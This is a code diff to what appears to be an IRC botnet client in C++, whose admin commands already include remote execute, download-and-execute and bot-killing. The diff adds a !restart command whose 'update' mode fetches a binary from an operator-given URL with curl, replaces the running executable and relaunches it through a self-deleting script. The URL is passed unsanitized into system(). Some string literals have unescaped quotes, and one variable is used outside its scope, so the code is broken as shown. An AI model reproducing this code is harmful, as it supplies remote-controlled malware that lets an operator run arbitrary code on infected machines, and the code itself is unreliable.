@@ -163,7 +163,7 @@ public:
         if (command == "!help") {
             std::string help = "Available commands: !help, !time, !version, !status";
             if (isAdmin(sender)) {
-                help += ", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute, !botkill, !botkiller";
+                help += ", !join, !part, !say, !quit, !restart, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute, !botkill, !botkiller";
             }
             sendCommand("PRIVMSG " + target + " :" + help);
         }
@@ -209,6 +209,156 @@ public:
             else if (command == "!quit") {
                 sendCommand("QUIT :Shutting down");
                 running = false;
+            }
+            else if (command == "!restart") {
+                std::string restartType;
+                iss >> restartType;
+                
+                log("Restart command received: " + restartType);
+                sendCommand("PRIVMSG " + target + " :Restart initiated: " + restartType);
+                
+                if (restartType == "soft") {
+                    // Soft restart - just reconnect
+                    log("Soft restart - reconnecting");
+                    sendCommand("QUIT :Soft restart");
+                    // The main loop will handle reconnection
+                    break; // Exit current connection loop to trigger reconnect
+                }
+                else if (restartType == "hard") {
+                    // Hard restart - restart the entire process
+                    log("Hard restart - restarting process");
+                    
+                    // Get current executable path
+                    char exePath[1024];
+                    #ifdef _WIN32
+                    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
+                    #else
+                    readlink("/proc/self/exe", exePath, sizeof(exePath));
+                    #endif
+                    
+                    // Create restart script
+                    std::string restartScript;
+                    #ifdef _WIN32
+                    restartScript = "@echo off\n";
+                    restartScript += "timeout /t 2 /nobreak > nul\n";
+                    restartScript += "\"" + std::string(exePath) + "\"\n";
+                    restartScript += "del "%~f0"\n";
+                    #else
+                    restartScript = "#!/bin/bash\n";
+                    restartScript += "sleep 2\n";
+                    restartScript += "\"" + std::string(exePath) + "\"\n";
+                    restartScript += "rm -- "$0"\n";
+                    #endif
+                    
+                    // Write restart script
+                    std::string scriptName;
+                    #ifdef _WIN32
+                    scriptName = "restart.bat";
+                    #else
+                    scriptName = "restart.sh";
+                    #endif
+                    
+                    std::ofstream scriptFile(scriptName);
+                    if (scriptFile.is_open()) {
+                        scriptFile << restartScript;
+                        scriptFile.close();
+                        
+                        // Make script executable (Unix)
+                        #ifndef _WIN32
+                        system(("chmod +x " + scriptName).c_str());
+                        #endif
+                        
+                        // Execute restart script
+                        #ifdef _WIN32
+                        system(("start /min " + scriptName).c_str());
+                        #else
+                        system(("./" + scriptName + " &").c_str());
+                        #endif
+                        
+                        sendCommand("QUIT :Hard restart");
+                        running = false;
+                    } else {
+                        sendCommand("PRIVMSG " + target + " :Failed to create restart script");
+                    }
+                }
+                else if (restartType == "update") {
+                    // Update restart - download new version and restart
+                    std::string updateUrl;
+                    iss >> updateUrl;
+                    
+                    if (!updateUrl.empty()) {
+                        log("Update restart - downloading new version from: " + updateUrl);
+                        
+                        // Download new version
+                        std::string downloadCmd = "curl -s -L -o bot_new " + updateUrl;
+                        int downloadResult = system(downloadCmd.c_str());
+                        
+                        if (downloadResult == 0) {
+                            // Make new version executable
+                            #ifndef _WIN32
+                            system("chmod +x bot_new");
+                            #endif
+                            
+                            // Create update restart script
+                            std::string updateScript;
+                            #ifdef _WIN32
+                            updateScript = "@echo off\n";
+                            updateScript += "timeout /t 2 /nobreak > nul\n";
+                            updateScript += "move /y bot_new " + std::string(exePath) + "\n";
+                            updateScript += "\"" + std::string(exePath) + "\"\n";
+                            updateScript += "del "%~f0"\n";
+                            #else
+                            updateScript = "#!/bin/bash\n";
+                            updateScript += "sleep 2\n";
+                            updateScript += "mv bot_new \"" + std::string(exePath) + "\"\n";
+                            updateScript += "\"" + std::string(exePath) + "\"\n";
+                            updateScript += "rm -- "$0"\n";
+                            #endif
+                            
+                            std::string updateScriptName;
+                            #ifdef _WIN32
+                            updateScriptName = "update_restart.bat";
+                            #else
+                            updateScriptName = "update_restart.sh";
+                            #endif
+                            
+                            std::ofstream updateScriptFile(updateScriptName);
+                            if (updateScriptFile.is_open()) {
+                                updateScriptFile << updateScript;
+                                updateScriptFile.close();
+                                
+                                // Make script executable (Unix)
+                                #ifndef _WIN32
+                                system(("chmod +x " + updateScriptName).c_str());
+                                #endif
+                                
+                                // Execute update restart script
+                                #ifdef _WIN32
+                                system(("start /min " + updateScriptName).c_str());
+                                #else
+                                system(("./" + updateScriptName + " &").c_str());
+                                #endif
+                                
+                                sendCommand("PRIVMSG " + target + " :Update downloaded, restarting with new version");
+                                sendCommand("QUIT :Update restart");
+                                running = false;
+                            } else {
+                                sendCommand("PRIVMSG " + target + " :Failed to create update restart script");
+                            }
+                        } else {
+                            sendCommand("PRIVMSG " + target + " :Failed to download update from: " + updateUrl);
+                        }
+                    } else {
+                        sendCommand("PRIVMSG " + target + " :Usage: !restart update <url>");
+                    }
+                }
+                else {
+                    // Default restart - soft restart
+                    log("Default restart - soft restart");
+                    sendCommand("PRIVMSG " + target + " :Usage: !restart [soft|hard|update <url>]");
+                    sendCommand("QUIT :Soft restart");
+                    break; // Exit current connection loop to trigger reconnect
+                }
             }
             else if (command == "!upload") {
                 std::string filename, content;
